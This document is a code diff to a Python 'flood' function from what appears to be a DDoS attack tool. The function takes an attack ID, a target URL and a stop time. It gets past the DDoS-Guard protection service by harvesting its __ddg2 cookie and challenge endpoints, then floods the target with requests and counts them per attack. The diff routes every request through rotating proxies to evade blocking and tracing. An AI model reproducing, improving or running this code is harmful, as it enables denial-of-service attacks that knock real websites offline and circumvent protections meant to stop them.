@@ -38,14 +38,14 @@ def flood(attack_id, url, stoptime) -> None:
         idss = None
 
         try:
-            with session.get(url, headers=headers, verify=False) as req:
+            with session.get(url, headers=headers, verify=False, proxies=utils().get_proxy()) as req:
                 for key, value in req.cookies.items():
                     Core.session.cookies.set_cookie(requests.cookies.create_cookie(key, value))
         except Exception:
             pass
         
         try:
-            with session.post("https://check.ddos-guard.net/check.js", headers=headers, verify=False) as req:
+            with session.post("https://check.ddos-guard.net/check.js", headers=headers, verify=False, proxies=utils().get_proxy()) as req:
                 for key, value in req.cookies.items():
                     if key == '__ddg2':
                         idss = value
@@ -56,14 +56,14 @@ def flood(attack_id, url, stoptime) -> None:
         
         if idss:
             try:
-                with session.get(f"{url}.well-known/ddos-guard/id/{idss}", headers=headers, verify=False) as req:
+                with session.get(f"{url}.well-known/ddos-guard/id/{idss}", headers=headers, verify=False, proxies=utils().get_proxy()) as req:
                     for key, value in req.cookies.items():
                         Core.session.cookies.set_cookie(requests.cookies.create_cookie(key, value))
             except Exception:
                 pass
         
         try:
-            with session.get("https://check.ddos-guard.net/check.js", headers=headers, verify=False) as req:
+            with session.get("https://check.ddos-guard.net/check.js", headers=headers, verify=False, proxies=utils().get_proxy()) as req:
                 src = re.search(r"new Image\(\).src = '(.+?)';", req.text)[1]
 
                 req = session.get(f'{urlparse(url).scheme}://{urlparse(url).netloc}{src}')
@@ -87,7 +87,8 @@ def flood(attack_id, url, stoptime) -> None:
                 timeout=(5,0.1), 
                 allow_redirects=False,
                 stream=False,
-                cert=None
+                cert=None,
+                proxies=utils().get_proxy()
             )
 
             Core.infodict[attack_id]['req_sent'] += 1
